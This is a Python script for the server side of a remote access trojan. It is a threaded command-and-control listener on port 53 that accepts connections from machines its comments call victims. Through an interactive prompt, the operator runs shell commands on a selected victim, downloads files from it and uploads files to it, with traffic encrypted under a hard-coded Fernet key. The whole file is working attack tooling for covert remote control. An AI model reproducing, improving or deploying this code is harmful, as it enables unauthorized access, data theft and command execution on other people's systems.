#!/usr/bin/python3
import socket
import sys
import threading
from queue import Queue
import os
from cryptography.fernet import Fernet



class server:
    server_sock = None
    port = 53
    # port = 3000
    hostname = socket.gethostname()
    host = socket.gethostbyname(hostname)
    BUFFER_SIZE = 20480

    # these are for denoting what jobs to perform, 1 for handling connection, 2 for interactive server
    JOB_NUM = [1, 2]
    queue = Queue()
    addrs = []
    conns = []

    # number of threads to handle our jobs. Since we only need one thread for each job, we create two threads
    WORKERS_NUM = 2

    SEPARATOR = "<SEPARATOR>"

    #generated before-hand with Fernet
    key ='YbBugTC9pGKLMdak53p6lmy7OVp3E5qegMkMq4iPxU4='

    def __init__(self):
        # create the two threads
        self.create_threads()

        # put jobs into the queue
        self.create_tasks()

    def create_threads(self):
        for _ in range(server.WORKERS_NUM):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            job = server.queue.get()
            if job == 1:
                self.create_sock()
                self.accept_connection()
            if job == 2:
                self.interactive_server()
            server.queue.task_done()


    def create_tasks(self):
        for i in server.JOB_NUM:
            server.queue.put(i)
        server.queue.join()


    def accept_connection(self):
        for conn in server.conns:
            conn.close()
        del server.conns[:]
        del server.addrs[:]
        while True:
            try:
                conn, addr = server.server_sock.accept()
                conn.setblocking(1)
                server.conns.append(conn)
                server.addrs.append(addr)
                print("connection from {} on port {}".format(addr[0], str(addr[1])))
            except Exception as error:
                print("accept error: {}".format(str(error)))


    def send_command(self, conn, addr):
        while True:
            cmd = input("{}> ".format(addr[0]))

            # if quit is hit, exit out of selected victom
            if cmd == 'quit':
                break

            # download file from victim
            if cmd[:8] == "download":
                if(len(cmd) <= 8):
                    print("choose a file")
                    continue
                try:
                    self.server_send(conn, str.encode(cmd))
                    self.recv_file(conn, addr)
                    continue
                except Exception as error:
                    print("connection lost: {}".format(str(error)))
                    break

            # upload file to victim
            if cmd[:6] == "upload":
                cmd_array = cmd.split(" ")
                if len(cmd_array) < 2:
                    print("choose a file")
                    continue
                if not os.path.exists(cmd_array[1]):
                    print("file does not exit, use relative or absolute path")
                    continue
                try:
                    self.server_send(conn, str.encode(cmd))
                    self.send_file(cmd_array[1], conn, addr)
                    continue
                except Exception as error:
                    print("connection lost: {}".format(str(error)))
                    break

            # run shell command
            if len(str.encode(cmd)) > 0:
                try:
                    self.server_send(conn, str.encode(cmd))
                    response = str(self.server_recv(conn), "utf-8")
                    print(response, end="")
                    continue
                except Exception as error:
                    print("connection lost: {}".format(str(error)))
                    break


    def create_sock(self):
        try:
            server.server_sock = socket.socket()
            server.server_sock.bind((server.host, server.port))
            server.server_sock.listen(5)
        except socket.error as error:
            print("socket creation error: {}".format(str(error)))
            sys.exit(1)


    def interactive_server(self):
        while True:
            cmd = input('Server> ')
            if cmd == 'list':
                self.list_conns()
                continue
            elif 'select' in cmd:
                cmd = cmd.split(" ")
                try:
                    conn_num = int(cmd[1])
                    if conn_num < 0 or conn_num >= len(server.conns):
                        print("no such connection number")
                        continue
                    conn = server.conns[conn_num]
                    addr = server.addrs[conn_num]
                    self.send_command(conn, addr)
                except Exception as error:
                    print("select <connection number>")
            else:
                continue


    def list_conns(self):
        result = ''
        for i, conn in enumerate(server.conns):
            try:
                self.server_send(conn, str.encode(' '))
                self.server_recv(conn)
            except Exception as error:
                del server.conns[i]
                del server.addrs[i]
            result += "connection {}: {}\n".format(i, str(server.addrs[i]))
        print(result)


    def recv_file(self, conn, addr):
        file_data = self.server_recv(conn).decode()
        # sending an ack to the client
        self.server_send(conn, " ".encode())

        if len(file_data) < 5:
            print(file_data)
            return
        if file_data[:5] != "BEGIN":
            print(file_data)
            return

        # start receiving file
        file_name, file_size = file_data.split(server.SEPARATOR)
        file_name = file_name.replace("BEGIN", "")
        print(f"starting downloading {file_name}, total size is {file_size} bytes")
        file_name = os.path.basename(file_name)
        file_size = int(file_size)
        with open(file_name, "wb") as file:
            bytes = self.server_recv(conn)
            while True:
                file.write(bytes)
                file_size -= server.BUFFER_SIZE
                if file_size <= 0:
                    break
                bytes = self.server_recv(conn)
        print("Done")


    def send_file(self, filename, conn, addr):
        file_size = os.path.getsize(filename)
        print(f"begin uploading {filename}, size is {file_size}")
        self.server_send(conn, f"BEGIN{filename}{server.SEPARATOR}{file_size}".encode())
        self.server_recv(conn)
        with open(filename, "rb") as file:
            bytes = file.read(server.BUFFER_SIZE)
            while bytes:
                self.server_send(conn, bytes)
                bytes = file.read(server.BUFFER_SIZE)
        print("done")

    # send the msg to the server. msg is in bytes and conn is the client connection
    def server_send(self, conn, msg):
        f = Fernet(server.key)
        encrypted = f.encrypt(msg)
        conn.send(encrypted)

    # receive message from the server, the returned message is in bytes, conn is the client connection
    def server_recv(self, conn):
        f = Fernet(server.key)
        message = conn.recv(server.BUFFER_SIZE)
        decyrpted = f.decrypt(message)
        return decyrpted

if __name__ == '__main__':
    server()
